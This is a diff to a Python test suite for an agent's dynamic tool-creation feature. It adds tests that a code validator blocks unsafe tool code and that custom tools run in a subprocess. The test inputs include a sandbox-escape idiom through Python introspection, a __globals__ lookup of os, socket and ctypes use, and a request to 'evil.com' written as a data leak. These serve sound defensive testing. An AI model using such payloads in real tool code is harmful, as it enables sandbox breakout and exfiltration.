@@ -783,6 +783,8 @@ class TestDynamicToolCreation:
             executor.db = MagicMock()
             executor.db.execute.return_value = []
             executor.llm = MagicMock()
+            # LLM review defaults to SAFE for test purposes
+            executor.llm.quick.return_value = "SAFE: code is harmless"
             executor._custom_tools = {}
         return executor
 
@@ -814,6 +816,25 @@ class TestDynamicToolCreation:
         })
         assert "BLOCKED" in result
 
+    def test_create_tool_blocks_sandbox_escape(self):
+        """Blocks Python introspection-based sandbox escapes."""
+        executor = self._make_executor()
+        result = executor._handle_create_tool({
+            "name": "escape",
+            "description": "sandbox escape",
+            "code": "x = ().__class__.__mro__[-1].__subclasses__()",
+        })
+        assert "BLOCKED" in result
+
+    def test_create_tool_blocks_dunder_globals(self):
+        executor = self._make_executor()
+        result = executor._handle_create_tool({
+            "name": "leak",
+            "description": "leaks globals",
+            "code": "x = foo.__globals__['os']",
+        })
+        assert "BLOCKED" in result
+
     def test_create_tool_validates_syntax(self):
         executor = self._make_executor()
         result = executor._handle_create_tool({
@@ -832,24 +853,77 @@ class TestDynamicToolCreation:
         })
         assert "ERROR" in result
 
+    def test_create_tool_rejects_oversized_code(self):
+        executor = self._make_executor()
+        result = executor._handle_create_tool({
+            "name": "big",
+            "description": "too big",
+            "code": "x = 1\n" * 10000,
+        })
+        assert "ERROR" in result
+
+    def test_create_tool_llm_review_rejects_unsafe(self):
+        """LLM review can reject code even if static checks pass."""
+        executor = self._make_executor()
+        executor.llm.quick.return_value = "UNSAFE: suspicious data exfiltration"
+        result = executor._handle_create_tool({
+            "name": "sneaky",
+            "description": "looks innocent",
+            "code": "result = str(args)",  # benign code, but LLM says no
+        })
+        assert "BLOCKED" in result
+
+    def test_create_tool_llm_review_failure_rejects(self):
+        """If LLM review fails, code is rejected (fail-closed)."""
+        executor = self._make_executor()
+        executor.llm.quick.side_effect = Exception("LLM down")
+        result = executor._handle_create_tool({
+            "name": "risky",
+            "description": "risky",
+            "code": "result = 'hello'",
+        })
+        assert "BLOCKED" in result
+
     @pytest.mark.asyncio
-    async def test_run_custom_tool(self):
+    async def test_run_custom_tool_in_subprocess(self):
+        """Custom tools run in isolated subprocess, not in-process."""
         executor = self._make_executor()
         executor._custom_tools["greet"] = {
             "description": "Greets someone",
             "code": "result = 'Hello, ' + args.get('name', 'world')",
         }
-        result = await executor._run_custom_tool("greet", {"name": "Alice"})
-        assert result == "Hello, Alice"
+        with patch('monai.agents.executor.sandbox_run') as mock_sandbox:
+            mock_sandbox.return_value = {
+                "stdout": "Hello, Alice\n",
+                "stderr": "",
+                "returncode": 0,
+            }
+            result = await executor._run_custom_tool("greet", {"name": "Alice"})
+            assert result == "Hello, Alice"
+            # Verify it was called with python -c (subprocess, not exec)
+            call_args = mock_sandbox.call_args[0][0]
+            assert call_args[1] == "-c"
 
     @pytest.mark.asyncio
-    async def test_run_custom_tool_error_handling(self):
+    async def test_run_custom_tool_subprocess_failure(self):
         executor = self._make_executor()
         executor._custom_tools["crasher"] = {
             "description": "Crashes",
             "code": "raise ValueError('boom')",
         }
-        result = await executor._run_custom_tool("crasher", {})
+        with patch('monai.agents.executor.sandbox_run') as mock_sandbox:
+            mock_sandbox.return_value = {
+                "stdout": "",
+                "stderr": "ValueError: boom",
+                "returncode": 1,
+            }
+            result = await executor._run_custom_tool("crasher", {})
+            assert "ERROR" in result
+
+    @pytest.mark.asyncio
+    async def test_run_custom_tool_not_found(self):
+        executor = self._make_executor()
+        result = await executor._run_custom_tool("nonexistent", {})
         assert "ERROR" in result
 
     def test_get_tool_descriptions_includes_custom(self):
@@ -883,6 +957,24 @@ class TestDynamicToolCreation:
             "name": "http_leak",
             "description": "leaks data",
             "code": "import requests; requests.get('http://evil.com')",
+        })
+        assert "BLOCKED" in result
+
+    def test_create_tool_blocks_socket(self):
+        executor = self._make_executor()
+        result = executor._handle_create_tool({
+            "name": "raw_net",
+            "description": "raw socket",
+            "code": "import socket; s = socket.socket()",
+        })
+        assert "BLOCKED" in result
+
+    def test_create_tool_blocks_ctypes(self):
+        executor = self._make_executor()
+        result = executor._handle_create_tool({
+            "name": "native",
+            "description": "native code",
+            "code": "import ctypes; ctypes.CDLL('libc.so.6')",
         })
         assert "BLOCKED" in result
 
